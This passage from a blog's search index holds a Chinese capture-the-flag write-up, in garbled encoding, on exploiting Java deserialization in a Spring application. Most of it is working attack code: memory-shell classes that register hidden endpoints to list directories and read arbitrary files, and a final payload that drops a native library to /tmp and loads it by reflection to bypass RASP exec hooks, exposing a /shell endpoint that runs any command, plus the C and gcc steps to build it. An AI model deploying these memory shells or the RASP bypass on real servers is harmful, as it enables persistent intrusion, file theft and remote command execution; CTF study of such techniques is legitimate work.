BufferedWriter(new FileWriter(&quot;output.txt&quot;)); writer.write(args); writer.close(); System.out.println(&quot;å­—ç¬¦ä¸²å·²æˆåŠŸå†™å…¥æ–‡ä»¶ã€‚&quot;); &#125; catch (IOException e) &#123; System.out.println(&quot;å†™å…¥æ–‡ä»¶æ—¶å‘ç”Ÿé”™è¯¯ï¼š&quot; + e.getMessage()); &#125; &#125; public static void ref(Object obj,String field,Object value) throws NoSuchFieldException, IllegalAccessException &#123; Field reffield = obj.getClass().getDeclaredField(field); reffield.setAccessible(true); reffield.set(obj,value); &#125; public static String serial(Object o) throws IOException, NoSuchFieldException&#123; ByteArrayOutputStream baos = new ByteArrayOutputStream(); ObjectOutputStream oos = new ObjectOutputStream(baos); oos.writeObject(o); oos.close(); String base64String = Base64.getEncoder().encodeToString(baos.toByteArray()); return base64String; &#125; public static void deserial(String data) throws Exception &#123; byte[] base64decodedBytes = Base64.getDecoder().decode(data); ByteArrayInputStream bais = new ByteArrayInputStream(base64decodedBytes); ObjectInputStream ois = new ObjectInputStream(bais); ois.readObject(); ois.close(); &#125;&#125; å†…å­˜ğŸçš„ä½¿ç”¨ğŸ¥µğŸ‘´æéº»éº»æ»´,å¤ªå¤æ‚äº†,è¿˜è¦å†™ä¸ªå†…å­˜é©¬æ‰¾åˆ°RASP,è¿˜å¥½ğŸ‘´æŠ€é«˜ä¸€ç­¹. åˆ—ç›®å½•nm,è·Ÿå–å¤§äº†ä¸€æ ·,æ•´è¿™bç©æ„,è‰¹ğŸ˜¡ é¦–å…ˆæ¥ä¸€ä¸ªé€’å½’åˆ—å‡ºæ‰€æœ‰ç›®å½•æ–‡ä»¶çš„ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182838485import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„ listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file.isFile()) &#123; response.getWriter().write(&quot;File: &quot; + file.getAbsolutePath()); &#125; else if (file.isDirectory()) &#123; response.getWriter().write(&quot;Directory: &quot; + file.getAbsolutePath()); listFilesAndDirectories(file,response); // é€’å½’éå†å­ç›®å½• &#125; &#125; &#125; &#125; &#125; è¿™æ ·çš„ç¼ºç‚¹æ˜¯åˆ—å‡ºæ ¹ç›®å½•çš„æ—¶å€™å¤ªå¤šæ‚ç¢çš„ä¸œè¥¿,ğŸ‘´çœ‹ä¸åŠ¨,è¦ä¸æ˜¯ğŸ‘´çŸ¥é“&#x2F;homeä¸‹é¢æœ‰ä¸œè¥¿,è¿™ç©æ„å¤ªéš¾æ‰¾äº†. ä¼˜åŒ–ä¸€ä¸‹ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576777879808182import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.File;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exls extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exls.class.getMethod(&quot;ls1&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/ls1&quot;).options(config).build(); exls readfile_inject = new exls(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public static void ls1(HttpServletRequest request,HttpServletResponse response) throws IOException &#123; String rootDirectory = request.getParameter(&quot;dir&quot;); // æ›¿æ¢ä¸ºä½ çš„æ ¹ç›®å½•è·¯å¾„ listFilesAndDirectories(new File(rootDirectory),response); response.getWriter().flush(); &#125; public static void listFilesAndDirectories(File directory,HttpServletResponse response) throws IOException &#123; File[] files = directory.listFiles(); if (files != null) &#123; for (File file : files) &#123; if (file!=null) &#123; response.getWriter().write(file.getAbsolutePath()+&quot;\\r\\n&quot;); &#125; &#125; &#125; &#125; &#125; è¿™æ ·çœ‹èµ·æ¥èˆ’æœå¤šäº†,ğŸ‘´å¾ˆä¸­æ„ğŸ˜Š è¯»æ–‡ä»¶ğŸ‘´æƒ³å°è¯•æŸç’æ¯çš„ä»£ç ,ç›´æ¥é€šè¿‡ResponseEntityä¸‹è½½æ–‡ä»¶,å¾ˆå¯æƒœ,å¤±è´¥äº†,ä½†æ˜¯æ¶‰åŠåˆ°äºŒè¿›åˆ¶æ–‡ä»¶çš„è¯»å–,æ€ä¹ˆåŠ,ğŸ‘´ç”¨base64è¯»å‡ºæ¥,ğŸ‘´çœŸtmæ˜¯å®Œç¾å¤©æ‰çš„idol(bushi) ç»ˆäºğŸ‘´æƒ³æ˜ç™½äº†ä¸€ä»¶äº‹,å†™å‡ºäº†å†…å­˜ğŸ 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273747576import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.http.*;import org.springframework.web.bind.annotation.GetMapping;import org.springframework.web.bind.annotation.RequestMapping;import org.springframework.web.bind.annotation.RequestParam;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.FileInputStream;import java.io.IOException;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.nio.file.Files;import java.nio.file.Path;import java.nio.file.Paths;import java.util.Base64;public class exre extends AbstractTranslet &#123; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125; static&#123; try&#123; WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method readmethod = exre.class.getMethod(&quot;readfile2&quot;, HttpServletRequest.class,HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/readfile2&quot;).options(config).build(); exre readfile_inject = new exre(); mappingHandlerMapping.registerMapping(info,readfile_inject,readmethod); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void readfile2(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String filePath = request.getParameter(&quot;filepath&quot;); if(filePath!=null)&#123; FileInputStream fileInputStream = new FileInputStream(filePath); byte[] fileBytes = new byte[fileInputStream.available()]; fileInputStream.read(fileBytes); fileInputStream.close(); String base64String = Base64.getEncoder().encodeToString(fileBytes); response.getWriter().write(base64String); response.getWriter().flush(); &#125; &#125;&#125; ä»€ä¹ˆ,ä½ è¯´ä½ ä¸ä¼šbase64è½¬æˆäºŒè¿›åˆ¶æ–‡ä»¶?ğŸ¤£ è‡ªå·±å†™ä¸ªè„šæœ¬è½¬æ¢éƒ½è¡Œ,ğŸ‘´å‘Šè¯‰ä½ ,è¿˜èƒ½ä¸Šcyberchefè½¬æ¢,è¿˜èƒ½å¯¼å‡ºä¸ºæ–‡ä»¶ğŸ˜… RASPğŸ˜…ğŸ˜¡ç»•è¿‡content-lengthå°±ç®€å•äº†?8å¯èƒ½! nmbç”šè‡³æœ‰RASP,âˆšâ…§,ğŸ‘´æ²¡å­¦è¿‡. å•¥äº‹RASPåœ¨2012å¹´çš„æ—¶å€™ï¼ŒGartnerå¼•å…¥äº†Runtime application self-protectionä¸€è¯ï¼Œç®€ç§°ä¸ºRASPã€‚å®ƒæ˜¯ä¸€ç§æ–°å‹åº”ç”¨å®‰å…¨ä¿æŠ¤æŠ€æœ¯ï¼Œå®ƒå°†ä¿æŠ¤ç¨‹åºåƒç–«è‹—ä¸€æ ·æ³¨å…¥åˆ°åº”ç”¨ç¨‹åºä¸­ï¼Œåº”ç”¨ç¨‹åºèä¸ºä¸€ä½“ï¼Œèƒ½å®æ—¶æ£€æµ‹å’Œé˜»æ–­å®‰å…¨æ”»å‡»ï¼Œä½¿åº”ç”¨ç¨‹åºå…·å¤‡è‡ªæˆ‘ä¿æŠ¤èƒ½åŠ›ï¼Œå½“åº”ç”¨ç¨‹åºé­å—åˆ°å®é™…æ”»å‡»ä¼¤å®³ï¼Œå°±å¯ä»¥è‡ªåŠ¨å¯¹å…¶è¿›è¡Œé˜²å¾¡ï¼Œè€Œä¸éœ€è¦è¿›è¡Œäººå·¥å¹²é¢„ã€‚ RASPæŠ€æœ¯å¯ä»¥å¿«é€Ÿçš„å°†å®‰å…¨é˜²å¾¡åŠŸèƒ½æ•´åˆåˆ°æ­£åœ¨è¿è¡Œçš„åº”ç”¨ç¨‹åºä¸­ï¼Œå®ƒæ‹¦æˆªä»åº”ç”¨ç¨‹åºåˆ°ç³»ç»Ÿçš„æ‰€æœ‰è°ƒç”¨ï¼Œç¡®ä¿å®ƒä»¬æ˜¯å®‰å…¨çš„ï¼Œå¹¶ç›´æ¥åœ¨åº”ç”¨ç¨‹åºå†…éªŒè¯æ•°æ®è¯·æ±‚ã€‚Webå’ŒéWebåº”ç”¨ç¨‹åºéƒ½å¯ä»¥é€šè¿‡RASPè¿›è¡Œä¿æŠ¤ã€‚è¯¥æŠ€æœ¯ä¸ä¼šå½±å“åº”ç”¨ç¨‹åºçš„è®¾è®¡ï¼Œå› ä¸ºRASPçš„æ£€æµ‹å’Œä¿æŠ¤åŠŸèƒ½æ˜¯åœ¨åº”ç”¨ç¨‹åºè¿è¡Œçš„ç³»ç»Ÿä¸Šè¿è¡Œçš„ã€‚ ğŸ‘´è¯´äººè¯:å°±æ˜¯nmæŠŠå†…å­˜è¿‡æ»¤,å®æ—¶åŠ¨æ€é˜²æŠ¤.åˆ«äººå«å†…å­˜é©¬,ä½ å«å†…å­˜ç›¾. è‡³äºè¿™ç©æ„,ğŸ‘´å°±ä¸åœ¨è¿™é‡Œèµ˜è¿°äº†,å…ˆç­‰ğŸ‘´æ–°å¼€ä¸ªæ–‡ç« ,è®°å½•ä¸€ä¸‹RASPçš„å­¦ä¹ ç¬”è®°. ğŸ‘´å›æ¥äº†,åˆ°äº†æœ€åçš„æ­¥éª¤äº†.,çœ‹ğŸ‘´ç»•è¿‡è¿™è¯¥æ­»çš„RASP. é€šè¿‡java-agentæ’æ¡©æŠ€æœ¯,hookä½äº†ä¸€äº›åº•å±‚çš„ç±»,ä½¿å¾—javaçš„execä¸èƒ½å¤Ÿæ‰§è¡Œ ä¸€èˆ¬æ˜¯unixæˆ–è¿™forkandexec forkAndExec é€šå¸¸æ˜¯ä¸æ“ä½œç³»ç»Ÿè¿›ç¨‹ç®¡ç†ç›¸å…³çš„æ“ä½œï¼Œç”¨äºåœ¨ç±»Unixæ“ä½œç³»ç»Ÿä¸­ï¼ˆå¦‚Linuxï¼‰åˆ›å»ºå­è¿›ç¨‹å¹¶åœ¨å­è¿›ç¨‹ä¸­æ‰§è¡ŒæŒ‡å®šçš„ç¨‹åºã€‚ å¯æ¶çš„RASP hookä½äº†è¿™äº›ç±» ç”šè‡³è¿˜ä¸è®©æœ¬åœ°JNIåŠ è½½äº†,loadLibrary0ä¹Ÿè¢«hookäº† è§£å†³æ–¹æ¡ˆğŸ˜’åº•å±‚çš„nativeæ–¹æ³• java.lang.ClassLoader.NativeLibrary#load å¹¶æœªè¢«hookï¼Œå¹¶ä¸”åå°„ä¹Ÿæ˜¯å¯ä»¥æ­£å¸¸ä½¿ç”¨çš„ï¼Œæ‰€ä»¥å¯ä»¥å°è¯•ä½¿ç”¨åå°„æ¥è°ƒç”¨ java.lang.ClassLoader.NativeLibrary ä¸­çš„ load æ–¹æ³•æ¥åŠ è½½æ¶æ„soæ–‡ä»¶æ‰§è¡Œå‘½ä»¤ èˆ¹æ–°å§¿åŠ¿ä¹‹javah å¯ä»¥,æˆ‘å°±å–œæ¬¢hğŸ˜Š javah æ˜¯ Java å¼€å‘å·¥å…·åŒ… (JDK) æä¾›çš„ä¸€ä¸ªå‘½ä»¤è¡Œå·¥å…·ï¼Œç”¨äºç”Ÿæˆ Java ç±»çš„æœ¬åœ°æ–¹æ³•æ¥å£ (Native Method Interface, JNI) å¤´æ–‡ä»¶ã€‚JNI å…è®¸ Java ä»£ç ä¸æœ¬åœ°ï¼ˆé€šå¸¸æ˜¯Cæˆ–C++ï¼‰ä»£ç è¿›è¡Œäº¤äº’ï¼Œè¿™åœ¨æŸäº›æƒ…å†µä¸‹éå¸¸æœ‰ç”¨ï¼Œä¾‹å¦‚ä¸ç¡¬ä»¶äº¤äº’æˆ–ä¸ç°æœ‰çš„æœ¬åœ°åº“è¿›è¡Œé›†æˆã€‚ ç¼–å†™åŒ…å«æœ¬åœ°æ–¹æ³•å£°æ˜çš„ Java ç±»ï¼Œä½¿ç”¨ native å…³é”®å­—å£°æ˜æœ¬åœ°æ–¹æ³•ã€‚ 123public class EvilClass &#123; public static native String execCmd(String cmd);&#125; ç„¶åä½¿ç”¨javacç¼–è¯‘æˆclass,ç„¶åä½¿ç”¨javahç¼–è¯‘æˆhæ–‡ä»¶ 12javah -jni EvilClass ç”Ÿæˆçš„EvilClass.hå¦‚ä¸‹ 12345678910111213141516171819202122/* DO NOT EDIT THIS FILE - it is machine generated */#include &lt;jni.h&gt;/* Header for class EvilClass */#ifndef _Included_EvilClass#define _Included_EvilClass#ifdef __cplusplusextern &quot;C&quot; &#123;#endif/* * Class: EvilClass * Method: execCmd * Signature: (Ljava/lang/String;)Ljava/lang/String; */JNIEXPORT jstring JNICALL Java_EvilClass_execCmd (JNIEnv *, jclass, jstring);#ifdef __cplusplus&#125;#endif#endif æ¥ä¸‹æ¥è¿˜è¦æ ¹æ®è¿™ä¸ªhæ–‡ä»¶å†™Cæ–‡ä»¶,nmğŸ‘´ä¸ä¼šc 1234567891011121314151617int execmd(const char *cmd, char *result)&#123; char buffer[1024*12]; //å®šä¹‰ç¼“å†²åŒº FILE *pipe = popen(cmd, &quot;r&quot;); //æ‰“å¼€ç®¡é“ï¼Œå¹¶æ‰§è¡Œå‘½ä»¤ if (!pipe) return 0; //è¿”å›0è¡¨ç¤ºè¿è¡Œå¤±è´¥ while (!feof(pipe)) &#123; if (fgets(buffer, 128, pipe)) &#123; //å°†ç®¡é“è¾“å‡ºåˆ°resultä¸­ strcat(result, buffer); &#125; &#125; pclose(pipe); //å…³é—­ç®¡é“ return 1; //è¿”å›1è¡¨ç¤ºè¿è¡ŒæˆåŠŸ&#125; è¿™é‡Œå¼€å¯äº†ä¸€ä¸ªç¼“å†²åŒº,popenæ˜¯Cä¸­æ‰§è¡Œå‘½ä»¤æ—¶æ‰“å¼€çš„ä¸€ä¸ªç®¡é“,ä»¥åªè¯»æ¨¡å¼æ‰“å¼€.å¦‚æœä¸ºç©º,åˆ™å‘½ä»¤æ‰§è¡Œå¤±è´¥,è¿”å›. åŒæ—¶whileä½¿ç”¨feofæ£€æµ‹pipeçŠ¶æ€,æœªç»“æŸå°±æŒç»­ä»pipeé‡Œé¢æ¯æ¬¡æœ€å¤§è·å–128ä¸ªå­—èŠ‚å†…å®¹,æ”¾åˆ°ç¼“å†²åŒº,ç„¶åå°†ç»“æœè¿½åŠ åˆ°resultä¸­. éšå 123456789101112131415161718JNIEXPORT jstring JNICALL Java_EvilClass_execCmd(JNIEnv *env, jclass class_object, jstring jstr)&#123; const char *cstr = (*env)-&gt;GetStringUTFChars(env, jstr, NULL); // è·å– Java å­—ç¬¦ä¸² jstr çš„ UTF-8 ç¼–ç  char result[1024 * 12] = &quot;&quot;; // å®šä¹‰ä¸€ä¸ªå­˜æ”¾å‘½ä»¤æ‰§è¡Œç»“æœçš„å­—ç¬¦æ•°ç»„ if (1 == execmd(cstr, result)) // è°ƒç”¨ä¹‹å‰å®šä¹‰çš„ execmd å‡½æ•°æ¥æ‰§è¡Œç³»ç»Ÿå‘½ä»¤ &#123; // å¦‚æœå‘½ä»¤æ‰§è¡ŒæˆåŠŸï¼Œä½ å¯ä»¥åœ¨è¿™é‡Œè¿›è¡Œä¸€äº›å¤„ç†ï¼Œä½†ä»£ç ä¸­è¢«æ³¨é‡Šæ‰äº† &#125; char return_messge[100] = &quot;&quot;; // å®šä¹‰ä¸€ä¸ªå­˜æ”¾è¿”å›æ¶ˆæ¯çš„å­—ç¬¦æ•°ç»„ strcat(return_messge, result); // å°†å‘½ä»¤æ‰§è¡Œç»“æœè¿½åŠ åˆ°è¿”å›æ¶ˆæ¯ jstring cmdresult = (*env)-&gt;NewStringUTF(env, return_messge); // åˆ›å»ºä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ return cmdresult; // è¿”å› Java å­—ç¬¦ä¸²ï¼ŒåŒ…å«å‘½ä»¤æ‰§è¡Œç»“æœ&#125; JNIè§„èŒƒJNIåŸå‹å‡½æ•°ï¼š JNIè§„èŒƒå®šä¹‰äº†ä¸€ç»„æ ‡å‡†çš„JNIå‡½æ•°åŸå‹ï¼Œå¦‚GetStringUTFCharsã€ReleaseStringUTFCharsç­‰ï¼Œä»¥æ–¹ä¾¿æ“ä½œå­—ç¬¦ä¸²ã€æ•°ç»„ã€å¼•ç”¨ç­‰å¸¸è§ä»»åŠ¡ã€‚ JNIå‡½æ•°å‘½åè§„èŒƒï¼š JNIå‡½æ•°çš„å‘½åå¿…é¡»éµå¾ªç‰¹å®šçš„å‘½åè§„èŒƒï¼Œé€šå¸¸æ˜¯Javaç±»åï¼ˆç”¨ä¸‹åˆ’çº¿æ›¿ä»£ç‚¹å·ï¼‰åè·ŸJavaæ–¹æ³•åã€‚ä¾‹å¦‚ï¼ŒJavaç±»com.example.MyClassä¸­çš„æ–¹æ³•myNativeFunctionå¯¹åº”çš„JNIå‡½æ•°åº”ä¸ºJava_com_example_MyClass_myNativeFunctionã€‚ JNIEnvæŒ‡é’ˆï¼š JNIå‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°æ˜¯ä¸€ä¸ªJNIEnvæŒ‡é’ˆï¼Œå®ƒæ˜¯ä¸€ä¸ªå…³äºJNIç¯å¢ƒçš„ä¸Šä¸‹æ–‡ã€‚é€šè¿‡JNIEnvï¼ŒJNIå‡½æ•°å¯ä»¥è®¿é—®Javaè™šæ‹Ÿæœºçš„å„ç§åŠŸèƒ½ï¼Œå¦‚å¯¹è±¡åˆ›å»ºã€æ–¹æ³•è°ƒç”¨å’Œå¼‚å¸¸å¤„ç†ã€‚ æ•°æ®ç±»å‹è½¬æ¢ï¼š JNIå®šä¹‰äº†å„ç§æ•°æ®ç±»å‹çš„å¯¹åº”å…³ç³»ï¼Œä»¥ä¾¿Javaå’Œæœ¬åœ°ä»£ç ä¹‹é—´çš„æ•°æ®ä¼ é€’ã€‚ä¾‹å¦‚ï¼ŒJavaçš„intå¯¹åº”JNIçš„jintï¼ŒJavaçš„Stringå¯¹åº”JNIçš„jstringç­‰ã€‚JNIå‡½æ•°å…è®¸åœ¨è¿™äº›æ•°æ®ç±»å‹ä¹‹é—´è¿›è¡Œè½¬æ¢ã€‚ ä»å‚æ•°ä¸Šçœ‹:å®ƒæ¥å—ä¸‰ä¸ªå‚æ•°ï¼šJNIEnv *envï¼ˆJNI ç¯å¢ƒæŒ‡é’ˆï¼‰ã€jclass class_objectï¼ˆè¡¨ç¤º Java ç±»çš„ç±»å¯¹è±¡ï¼‰ã€jstring jstrï¼ˆä¸€ä¸ª Java å­—ç¬¦ä¸²ï¼‰ã€‚ é€šè¿‡ (*env)-&gt;GetStringUTFChars å‡½æ•°å°† Java å­—ç¬¦ä¸² jstr è½¬æ¢ä¸º C å­—ç¬¦ä¸² cstrï¼Œè¿™æ˜¯å› ä¸º execmd å‡½æ•°éœ€è¦æ¥å— C å­—ç¬¦ä¸²ä½œä¸ºå‚æ•°ã€‚ ä¸­é—´æ‰§è¡Œå‘½ä»¤,å­˜å‚¨. ä½¿ç”¨ (*env)-&gt;NewStringUTF å‡½æ•°åˆ›å»ºä¸€ä¸ªæ–°çš„ Java å­—ç¬¦ä¸² cmdresultï¼Œç”¨äºå­˜å‚¨è¿”å›æ¶ˆæ¯ã€‚ å°†ä¸¤éƒ¨åˆ†æ”¾åœ¨ä¸€èµ·,å½¢æˆcæ–‡ä»¶,ç„¶åç¼–è¯‘ ç¼–è¯‘: 12gcc -FPIC -I /home/siroha/java8202/include -I /home/siroha/java8202/include/linux -shared -o libcmd.so ./EvilClass.cbase64 -w 0 libcmd.so &gt; Evil.txt å†™æ–‡ä»¶çš„æ“ä½œ 1234RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); æœ€ç»ˆå†™ä¸ªloadçš„å†…å­˜ğŸ 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495969798import com.sun.org.apache.xalan.internal.xsltc.DOM;import com.sun.org.apache.xalan.internal.xsltc.TransletException;import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator;import com.sun.org.apache.xml.internal.serializer.SerializationHandler;import org.springframework.web.context.WebApplicationContext;import org.springframework.web.context.request.RequestContextHolder;import org.springframework.web.servlet.mvc.method.RequestMappingInfo;import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping;import javax.servlet.http.HttpServletRequest;import javax.servlet.http.HttpServletResponse;import java.io.IOException;import java.io.RandomAccessFile;import java.lang.reflect.Constructor;import java.lang.reflect.Field;import java.lang.reflect.Method;import java.util.Base64;import java.util.Vector;public class EvilClass extends AbstractTranslet &#123; public static native String execCmd(String cmd); private static final String EVIL_JNI_BASE64 = &quot;&quot;;//ğŸ‘´å°±ä¸æ”¾åœ¨è¿™é‡Œäº†,å¤ªé•¿äº†,è‡ªå·±ç”Ÿæˆ private static final String LIB_PATH = &quot;/tmp/libcmd.so&quot;; static &#123; try&#123; byte[] jniBytes = Base64.getDecoder().decode(EVIL_JNI_BASE64); RandomAccessFile randomAccessFile = new RandomAccessFile(LIB_PATH, &quot;rw&quot;); randomAccessFile.write(jniBytes); randomAccessFile.close(); //è°ƒç”¨java.lang.ClassLoader$NativeLibraryç±»çš„loadæ–¹æ³•åŠ è½½åŠ¨æ€é“¾æ¥åº“ ClassLoader cmdLoader = EvilClass.class.getClassLoader(); Class&lt;?&gt; classLoaderClazz = Class.forName(&quot;java.lang.ClassLoader&quot;); Class&lt;?&gt; nativeLibraryClazz = Class.forName(&quot;java.lang.ClassLoader$NativeLibrary&quot;); Method load = nativeLibraryClazz.getDeclaredMethod(&quot;load&quot;, String.class, boolean.class); load.setAccessible(true); Field field = classLoaderClazz.getDeclaredField(&quot;nativeLibraries&quot;); field.setAccessible(true); Vector&lt;Object&gt; libs = (Vector&lt;Object&gt;) field.get(cmdLoader); Constructor&lt;?&gt; nativeLibraryCons = nativeLibraryClazz.getDeclaredConstructor(Class.class, String.class, boolean.class); nativeLibraryCons.setAccessible(true); Object nativeLibraryObj = nativeLibraryCons.newInstance(EvilClass.class, LIB_PATH, false); libs.addElement(nativeLibraryObj); field.set(cmdLoader, libs); load.invoke(nativeLibraryObj, LIB_PATH, false); //å†™å…¥å†…å­˜é©¬ WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(&quot;org.springframework.web.servlet.DispatcherServlet.CONTEXT&quot;, 0); RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); Field configField = mappingHandlerMapping.getClass().getDeclaredField(&quot;config&quot;); configField.setAccessible(true); RequestMappingInfo.BuilderConfiguration config = (RequestMappingInfo.BuilderConfiguration) configField.get(mappingHandlerMapping); Method method2 = EvilClass.class.getMethod(&quot;shell&quot;, HttpServletRequest.class, HttpServletResponse.class); RequestMappingInfo info = RequestMappingInfo.paths(&quot;/shell&quot;) .options(config) .build(); EvilClass springControllerMemShell = new EvilClass(); mappingHandlerMapping.registerMapping(info, springControllerMemShell, method2); &#125;catch (Exception e)&#123; e.printStackTrace(); &#125; &#125; public void shell(HttpServletRequest request, HttpServletResponse response) throws IOException &#123; String cmd = request.getParameter(&quot;cmd&quot;); if (cmd != null) &#123; String execRes = EvilClass.execCmd(cmd); response.getWriter().write(execRes); response.getWriter().flush(); &#125; &#125; @Override public void transform(DOM document, SerializationHandler[] handlers) throws TransletException &#123; &#125; @Override public void transform(DOM document, DTMAxisIterator iterator, SerializationHandler handler) throws TransletException &#123; &#125;&#125; NativeLibraryåŒ…è£…åˆ°Vector,Vectoræ˜¯Classloaderä¸­nativeLibrariesçš„å€¼, ä¸€èˆ¬æ¥è¯´ç”¨ 1234System.loadLibrary(&quot;cmd&quot;); Command command = new Command(); String ipconfig = command.exec(&quot;ipconfig&quot;); System.out.println(ipconfig); é¢˜ç›®banäº†. èŠœæ¹–,çœŸâˆšâ…§çˆ½,âˆšâ…§çœŸçˆ½,ç»ˆå‡ºäº†. æéº»éº»åœ°,ğŸ‘´èŠ±äº†å‡ å¤©æ—¶é—´,å­¦äº†ä¸€å †ä¸œè¥¿. æ€ä¹ˆåˆ¶ä½œé“¾å­,æ€ä¹ˆpythonå‘åŒ…,ğŸ‘´åœ¨å‰é¢å·²ç»åˆ†æè¿‡äº†.ä¸ç”¨é—®äº†ğŸ˜…","path":"2023/11/30/DAS0RAYSxCBCTFå¤ç°/","date":"11-30","excerpt":"","tags":[]},{"title":"Hello World","text":"Welcome to Hexo! This is your very first post. Check documentation for more info. If you get any problems when 